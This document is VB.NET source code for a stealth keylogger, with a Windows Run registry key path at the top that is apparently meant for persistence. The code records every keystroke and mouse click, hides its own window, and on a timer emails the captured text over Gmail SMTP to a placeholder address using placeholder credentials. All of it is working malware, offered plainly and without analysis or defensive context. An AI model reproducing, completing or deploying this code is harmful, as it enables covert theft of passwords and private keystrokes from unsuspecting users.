HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Imports System.Net.Mail Mail Class

Public Class Form1
    Dim result As Integer
    Private Declare Function GetAsyncKeyState Lib "USER32" (ByVal vKey As Long) As Integer
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Timer1.Start()
        Timer2.Start()
        Timer3.Start()

    End Sub
    Public Function GetCapslock() As Boolean

        GetCapslock = CBool(GetKeyState(&H14) And 1)

    End Function

    Public Function GetShift() As Boolean


        GetShift = CBool(GetAsyncKeyState(&H10))

    End Function
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        For i As Integer = 1 To 225
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                If GetCapslock() = True And GetShift() = True Then
                    Select Case (i)
                        Case 192
                            TextBox1.Text = TextBox1.Text + "~"
                        Case 1
                            TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48
                            TextBox1.Text = TextBox1.Text + ")"
                        Case 49
                            TextBox1.Text = TextBox1.Text + "!"
                        Case 50
                            TextBox1.Text = TextBox1.Text + "@"
                        Case 51
                            TextBox1.Text = TextBox1.Text + "#"
                        Case 52
                            TextBox1.Text = TextBox1.Text + "$"
                        Case 53
                            TextBox1.Text = TextBox1.Text + "%"
                        Case 54
                            TextBox1.Text = TextBox1.Text + "^"
                        Case 55
                            TextBox1.Text = TextBox1.Text + "&"
                        Case 56
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 57
                            TextBox1.Text = TextBox1.Text + "("
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + ">"
                        Case 16
                        Case 160 To 165
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[Ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "_"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 219
                            TextBox1.Text = TextBox1.Text + "{"
                        Case 221
                            TextBox1.Text = TextBox1.Text + "}"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ":"
                        Case 222
                            TextBox1.Text = TextBox1.Text + """"
                        Case 188
                            TextBox1.Text = TextBox1.Text + "<"
                        Case 191
                            TextBox1.Text = TextBox1.Text + "?"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "|"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 20
                        Case 91
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40
                        Case Else
                            TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                    End Select
                End If
                If GetCapslock() = True And GetShift() = False Then
                    Select Case (i)
                        Case 91
                        Case 1
                            TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48 To 57
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + "."
                        Case 16
                        Case 160 To 165
                        Case 20
                        Case 192
                            TextBox1.Text = TextBox1.Text + "`"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "="
                        Case 219
                            TextBox1.Text = TextBox1.Text + "["
                        Case 221
                            TextBox1.Text = TextBox1.Text + "]"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ";"
                        Case 222
                            TextBox1.Text = TextBox1.Text + "'"
                        Case 188
                            TextBox1.Text = TextBox1.Text + ","
                        Case 191
                            TextBox1.Text = TextBox1.Text + "/"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "\"
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[Ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 13
                            TextBox1.Text = TextBox1.Text + "[Enter]" + vbNewLine
                        Case 9
                            TextBox1.Text = TextBox1.Text + "[Tab]"
                        Case 2
                            TextBox1.Text = TextBox1.Text + "[RightMouseClick]"
                        Case 37 To 40
                        Case Else
                            TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                    End Select
                End If
                If GetCapslock() = False And GetShift() = True Then
                    Select Case (i)
                        Case 91 
                        Case 192
                            TextBox1.Text = TextBox1.Text + "~"
                        Case 1
                            TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48
                            TextBox1.Text = TextBox1.Text + ")"
                        Case 49
                            TextBox1.Text = TextBox1.Text + "!"
                        Case 50
                            TextBox1.Text = TextBox1.Text + "@"
                        Case 51
                            TextBox1.Text = TextBox1.Text + "#"
                        Case 52
                            TextBox1.Text = TextBox1.Text + "$"
                        Case 53
                            TextBox1.Text = TextBox1.Text + "%"
                        Case 54
                            TextBox1.Text = TextBox1.Text + "^"
                        Case 55
                            TextBox1.Text = TextBox1.Text + "&"
                        Case 56
                            TextBox1.Text = TextBox1.Text + "*"
                        Case 57
                            TextBox1.Text = TextBox1.Text + "("
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + ">"
                        Case 16
                        Case 160 To 165
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[Ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "_"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "+"
                        Case 219
                            TextBox1.Text = TextBox1.Text + "{"
                        Case 221
                            TextBox1.Text = TextBox1.Text + "}"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ":"
                        Case 222
                            TextBox1.Text = TextBox1.Text + """"
                        Case 188
                            TextBox1.Text = TextBox1.Text + "<"
                        Case 191
                            TextBox1.Text = TextBox1.Text + "?"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "|"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 20
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40
                        Case Else
                            TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                    End Select
                End If
                If GetCapslock() = False And GetShift() = False Then
                    Select Case (i)
                        Case 1
                            TextBox1.Text = TextBox1.Text + "[Left Mouse Click]"
                        Case 64 To 90
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 97 To 122
                            TextBox1.Text = TextBox1.Text + Chr(i).ToString.ToLower
                        Case 32
                            TextBox1.Text = TextBox1.Text + " "
                        Case 48 To 57
                            TextBox1.Text = TextBox1.Text + Chr(i)
                        Case 8
                            TextBox1.Text = TextBox1.Text + "[BackSpace]"
                        Case 46
                            TextBox1.Text = TextBox1.Text + "[Del]"
                        Case 190
                            TextBox1.Text = TextBox1.Text + "."
                        Case 16
                        Case 160 To 165
                        Case 20
                        Case 192
                            TextBox1.Text = TextBox1.Text + "`"
                        Case 189
                            TextBox1.Text = TextBox1.Text + "-"
                        Case 187
                            TextBox1.Text = TextBox1.Text + "="
                        Case 91 'windows key
                        Case 219
                            TextBox1.Text = TextBox1.Text + "["
                        Case 221
                            TextBox1.Text = TextBox1.Text + "]"
                        Case 186
                            TextBox1.Text = TextBox1.Text + ";"
                        Case 222
                            TextBox1.Text = TextBox1.Text + "'"
                        Case 188
                            TextBox1.Text = TextBox1.Text + ","
                        Case 191
                            TextBox1.Text = TextBox1.Text + "/"
                        Case 220
                            TextBox1.Text = TextBox1.Text + "\"
                        Case 17
                            TextBox1.Text = TextBox1.Text + "[Ctrl]"
                        Case 18
                            TextBox1.Text = TextBox1.Text + "[Alt]"
                        Case 13
                            TextBox1.Text = TextBox1.Text + " [Enter]" + vbNewLine
                        Case 9
                            TextBox1.Text = TextBox1.Text + " [Tab]"
                        Case 2
                            TextBox1.Text = TextBox1.Text + " [RightMouseClick]"
                        Case 37 To 40

                        Case Else
                            TextBox1.Text = TextBox1.Text + " Ascii(" + i.ToString + ") "
                    End Select
                End If

            End If
        Next i
    End Sub

    Sub MainEvents()
        Try
            Dim MyMailMessage As New MailMessage()
            MyMailMessage.From = New MailAddress("email")
            MyMailMessage.To.Add("email")
            MyMailMessage.Subject = "messagename"
            MyMailMessage.Body = TextBox1.Text
            Dim SMPT As New SmtpClient("smtp.gmail.com")
            SMPT.Port = 587
            SMPT.EnableSsl = True
            SMPT.Credentials = New System.Net.NetworkCredential("email", "password")
            SMPT.Send(MyMailMessage)
            TextBox1.Text = ""
        Catch ex As Exception
        End Try
    End Sub

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick

        If TextBox1.Text <> "" Then
            MainEvents()
        End If
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        Me.Visible = False
        Me.Hide()
    End Sub



End Class